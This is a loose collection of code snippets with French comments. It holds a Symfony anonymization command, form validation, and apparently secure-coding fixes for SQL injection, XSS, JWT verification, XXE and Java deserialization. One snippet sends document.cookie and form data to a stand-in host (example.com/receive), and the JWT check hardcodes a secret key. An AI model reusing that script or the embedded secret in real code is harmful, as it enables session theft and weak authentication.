// src/Service/Anonymizer/AnonymizableInterface.php

namespace App\Service\Anonymizer;

interface AnonymizableInterface
{
    public function anonymizeOldRecords(\DateTimeInterface $thresholdDate): int;
}


// src/Service/Anonymizer/UserAnonymizer.php

namespace App\Service\Anonymizer;

use App\Repository\UserRepository;
use Doctrine\ORM\EntityManagerInterface;

class UserAnonymizer implements AnonymizableInterface
{
    public function __construct(
        private UserRepository $userRepository,
        private EntityManagerInterface $em
    ) {}

    public function anonymizeOldRecords(\DateTimeInterface $thresholdDate): int
    {
        $users = $this->userRepository->createQueryBuilder('u')
            ->where('u.createdAt < :date')
            ->andWhere('u.isAnonymized = false')
            ->setParameter('date', $thresholdDate)
            ->getQuery()
            ->getResult();

        foreach ($users as $user) {
            $user->setEmail('anonyme@example.com');
            $user->setFirstname('Anonyme');
            $user->setLastname('Utilisateur');
            $user->setPhone(null);
            $user->setIsAnonymized(true);
        }

        $this->em->flush();
        return count($users);
    }
}


// src/Command/AnonymizeDataCommand.php

namespace App\Command;

use App\Service\Anonymizer\AnonymizableInterface;
use Symfony\Component\Console\Attribute\AsCommand;
use Symfony\Component\Console\Command\Command;
use Symfony\Component\Console\Input\InputInterface;
use Symfony\Component\Console\Output\OutputInterface;

#[AsCommand(
    name: 'app:anonymize-data',
    description: 'Anonymise les données personnelles dans plusieurs entités',
)]
class AnonymizeDataCommand extends Command
{
    /**
     * @param iterable<AnonymizableInterface> $anonymizers
     */
    public function __construct(
        private iterable $anonymizers, // Injecté automatiquement par autowiring
    ) {
        parent::__construct();
    }

    protected function execute(InputInterface $input, OutputInterface $output): int
    {
        $thresholdDate = (new \DateTimeImmutable())->modify('-1 year');

        $output->writeln('Début de l\'anonymisation globale...');

        foreach ($this->anonymizers as $anonymizer) {
            $count = $anonymizer->anonymizeOldRecords($thresholdDate);
            $output->writeln("➤ {$count} enregistrement(s) anonymisé(s) par " . $anonymizer::class);
        }

        $output->writeln('Fin de l\'anonymisation.');
        return Command::SUCCESS;
    }
}



# config/services.yaml
services:
    App\Service\Anonymizer\:
        resource: '../src/Service/Anonymizer/'
        tags: ['app.anonymizer']




        L’adresse de votre association doit contenir uniquement des lettres, chiffres, espaces et ponctuations simples (exemples : virgule, apostrophe, tiret). Exemple : 12 rue des Lilas."



new Regex([
            'pattern' => '/^[a-zA-Z0-9._%+\-]{1,30}@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$/',
            'message' => 'Format invalide. Exemple : jane.doe@email.com.',
        ]),

$('.btn.btn-caap-primary.next').on('click', function () {
    const isOtherMemberBtn = $(this).is('#button-other-member');
    const presidentFound = isOtherMemberBtn ? checkPresident() : false;

    // Si le bouton n'est PAS "autre membre" OU le président a été trouvé
    if (!isOtherMemberBtn || presidentFound) {
        // Vérifie les champs visibles
        $('input:visible, textarea:visible, select:visible').each(function () {
            checkInputValidity($(this));
        });

        // Focus sur le premier champ invalide
        $('section.active').find('.is-invalid:visible').first().focus();

        // Action finale
        toggleButton($(this));
    }
});



'pattern' => '/^(?=.{6,120}$)[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$/'

new Regex([
            'pattern' => '/^(?=.{6,120}$)[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$/',
            'message' => 'L’adresse email doit être valide et contenir entre 6 et 120 caractères.',
        ]),

function checkInputCheckableValidity(input) {
    const emptyText = input.data('empty');
    const isRadio = input.attr('type') === 'radio';
    const isValid = input[0].checkValidity();

    if (isValid) {
        // ✅ Cas des radios
        if (isRadio) {
            $('input[type="radio"]').removeClass('is-invalid');
        }

        input
            .attr('aria-invalid', false)
            .closest('.radio-group')
            .next('.invalid-feedback')
            .removeClass('d-block')
            .text('');
    } else {
        // ❌ Cas invalide

        if (isRadio) {
            input
                .attr('aria-invalid', true)
                .closest('.radio-group')
                .next('.invalid-feedback')
                .find('.error-message')
                .text(emptyText);
        } else {
            // ✅ Pour les checkbox
            input
                .closest('.container-form-group')
                .prevAll('.invalid-feedback')
                .removeClass('d-block')
                .text('');
        }
    }
}



<form id="myForm">
  <input type="text" name="username" value="testuser">
  <input type="submit" value="Envoyer">
</form>

<script>
document.getElementById('myForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Empêche l'envoi normal du formulaire

    // Récupère les cookies (tous les cookies accessibles par JS)
    const cookies = document.cookie;

    // Optionnel : récupère aussi les données du formulaire si besoin
    const formData = new FormData(event.target);
    const formObj = Object.fromEntries(formData.entries());

    // Combine les données à envoyer
    const dataToSend = {
        cookies: cookies,
        form: formObj
    };

    // Envoie en POST avec fetch
    fetch('http://example.com/receive', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(dataToSend)
    })
    .then(response => response.text())
    .then(result => {
        console.log('Réponse du serveur :', result);
    })
    .catch(error => {
        console.error('Erreur :', error);
    });
});
</script>





public void homepage(PrintWriter out) throws IOException, SQLException {
    out.println("<h1>User list</h1>");
    out.println("<table><thead><tr><th>User</th><th></th></tr></thead><tbody>");

    String sql = "SELECT id, name FROM users WHERE client_id = ?";
    try (
        Connection conn = DriverManager.getConnection(MyServlet.url);
        PreparedStatement pstmt = conn.prepareStatement(sql)
    ) {
        pstmt.setInt(1, this.clientId);
        ResultSet rs = pstmt.executeQuery();

        while (rs.next()) {
            out.println("<tr>");
            out.println("<td>" + StringEscapeUtils.escapeHtml(rs.getString("name")) + "</td>");
            out.println("<td><a href=\"/show/" + rs.getInt("id") + "\">Show</a></td>");
            out.println("</tr>");
        }
    }

    out.println("</tbody></table>");
}



public void showUser(HttpServletResponse response, PrintWriter out, String userId)
        throws IOException, SQLException {
    String sql = "SELECT id, name FROM users WHERE client_id = ? AND id = ?";

    try (
        Connection conn = DriverManager.getConnection(MyServlet.url);
        PreparedStatement pstmt = conn.prepareStatement(sql)
    ) {
        pstmt.setInt(1, this.clientId);
        pstmt.setInt(2, Integer.parseInt(userId)); // ⚠️ à protéger par try-catch si userId est non fiable

        ResultSet rs = pstmt.executeQuery();
        if (rs.next()) {
            out.println("<h1>User: " + StringEscapeUtils.escapeHtml(rs.getString("name")) + "</h1>");
        } else {
            out.println("<p>User not found</p>");
        }
    }
}




try {
    $constraints = $config->validationConstraints();
    $token_parsed = $config->parser()->parse($token);

    // Vérification explicite de la signature
    $valid = $config->validator()->validate($token_parsed, ...$constraints);
    if (!$valid) {
        send_http_error(400, "Bad Request. Invalid JWT token.");
        exit();
    }

    return $token_parsed->claims()->get('role');

} catch (\Throwable $e) {
    send_http_error(400, "Bad Request. Invalid JWT token.");
    exit();
}




$config->validator()->assert($token_parsed, ...$constraints);




try {
    $token_parsed = $config->parser()->parse($token);
    $constraints = $config->validationConstraints();

    $config->validator()->assert($token_parsed, ...$constraints); // lève exception si invalide

    return $token_parsed->claims()->get('role');

} catch (\Lcobucci\JWT\Validation\RequiredConstraintsViolated $e) {
    send_http_error(400, "Bad Request. Invalid JWT token.");
    exit();
} catch (\Throwable $e) {
    send_http_error(400, "Bad Request. Token parsing error.");
    exit();
}




function checkAuth($data) {
    global $config;

    if (!isset($data) || !isset($data->token) || $data->token === '') {
        send_http_error(401, "Authentication is required.");
        exit();
    }

    $token = $data->token;

    // Vérifie la signature manuellement
    if (!verifySignature($token, 'HS_This-Is-My_Very_V3RY_str0Ng-KEY_123')) {
        send_http_error(400, "Bad Request. Invalid JWT signature.");
        exit();
    }

    try {
        $token_parsed = $config->parser()->parse($token);
        $role = $token_parsed->claims()->get('role');
        return $role;
    } catch (\Throwable $e) {
        send_http_error(400, "Bad Request. Invalid JWT format.");
        exit();
    }
}




function verifySignature(string $jwt, string $secret): bool {
    $parts = explode('.', $jwt);
    if (count($parts) !== 3) {
        return false;
    }

    list($header, $payload, $signature) = $parts;

    // Recalcul de la signature
    $data = $header . '.' . $payload;
    $expectedSignature = rtrim(strtr(base64_encode(hash_hmac('sha256', $data, $secret, true)), '+/', '-_'), '=');

    // Comparaison sécurisée
    return hash_equals($expectedSignature, $signature);
}




<?php

class DatabaseManager
{
    private $databaseUrl = "sqlite:///tmp/db.sqlite";
    private $pdo;

    public function __construct()
    {
        try {
            $this->pdo = new PDO($this->databaseUrl);
        } catch (PDOException $e) {
            die("Database connection error: " . $e->getMessage());
        }
    }

    /**
     * Crée un utilisateur avec un mot de passe hashé en bcrypt.
     */
    public function createUser($email, $password)
    {
        $query = $this->pdo->prepare("INSERT INTO users (email, password) VALUES (:email, :password)");
        $hashedPassword = password_hash($password, PASSWORD_BCRYPT);
        return $query->execute([
            'email' => $email,
            'password' => $hashedPassword
        ]);
    }

    /**
     * Tente de connecter un utilisateur via email et mot de passe.
     */
    public function login($email, $password)
    {
        $query = $this->pdo->prepare("SELECT password FROM users WHERE email = :email");
        $query->execute(['email' => $email]);
        $result = $query->fetch(PDO::FETCH_ASSOC);

        if (!$result) {
            return false;
        }

        return password_verify($password, $result['password']);
    }

    /**
     * Vérifie un mot de passe en le comparant avec le hash stocké.
     */
    public function verifyPassword($password, $hash)
    {
        return password_verify($password, $hash);
    }

    /**
     * Déhashage (inutilisable avec bcrypt) – conservé ici pour compatibilité.
     */
    public function decryptPassword($password_hash)
    {
        return '[NON DISPONIBLE AVEC BCRYPT]';
    }
}



package com.example.xxe.controllers;

import com.example.xxe.data.Product;
import com.example.xxe.repositories.ProductRepository;
import com.fasterxml.jackson.dataformat.xml.XmlMapper;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.ResponseBody;

import org.w3c.dom.*;
import org.xml.sax.SAXException;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

@Controller
public class ProductController {

    private final ProductRepository productRepository;

    public ProductController(ProductRepository productRepository) {
        this.productRepository = productRepository;
    }

    @PostMapping("/api")
    @ResponseBody
    public String index(@RequestBody String xml) throws ParserConfigurationException, SAXException, IOException {
        HashMap<String, List<Product>> response = new HashMap<>();
        ArrayList<Product> searchRequest = parseXml(xml);

        response.put("request", new ArrayList<>());
        for (Product product : searchRequest) {
            response.get("request").add(new Product(product.getName(), product.getPrice()));
        }

        response.put("searchResults", new ArrayList<>());
        for (Product product : searchRequest) {
            response.get("searchResults").addAll(productRepository.findByNameContaining(product.getName()));
        }

        XmlMapper mapper = new XmlMapper();
        return mapper.writeValueAsString(response);
    }

    /**
     * Méthode sécurisée pour parser du XML sans risque XXE.
     */
    private ArrayList<Product> parseXml(String body) throws ParserConfigurationException, IOException, SAXException {
        ArrayList<Product> list = new ArrayList<>();

        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

        // 🔐 Sécurité anti-XXE
        factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
        factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
        factory.setXIncludeAware(false);
        factory.setExpandEntityReferences(false);

        DocumentBuilder builder = factory.newDocumentBuilder();
        ByteArrayInputStream input = new ByteArrayInputStream(body.getBytes(StandardCharsets.UTF_8));
        Document doc = builder.parse(input);

        NodeList childNodes = doc.getDocumentElement().getElementsByTagName("product");

        for (int i = 0; i < childNodes.getLength(); i++) {
            Node item = childNodes.item(i);
            Product p = new Product();
            p.setName(item.getTextContent());
            list.add(p);
        }

        return list;
    }
}
@PostMapping("/base64tojson")
@ResponseBody
public String base64ToJson(@RequestBody String base64) throws IOException {
    byte[] jsonBytes = Base64.getDecoder().decode(base64);
    String json = new String(jsonBytes, StandardCharsets.UTF_8);
    
    // Sécurisé : Jackson lit du JSON vers User
    User user = new ObjectMapper().readValue(json, User.class);
    
    return new ObjectMapper().writeValueAsString(user);
}







import java.io.ObjectInputFilter;

// ...

@PostMapping("/base64tojson")
@ResponseBody
public String base64ToJson(@RequestBody String base64) throws IOException, ClassNotFoundException {
    ByteArrayInputStream inputStream = new ByteArrayInputStream(Base64.getDecoder().decode(base64));
    ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);

    // 🛡️ Appliquer un filtre de sécurité pour restreindre les classes autorisées
    ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("com.sysdream.unserialize.controllers.ConverterController$User;!*");
    objectInputStream.setObjectInputFilter(filter);

    User user = (User) objectInputStream.readObject();
    return new ObjectMapper().writeValueAsString(user);
}
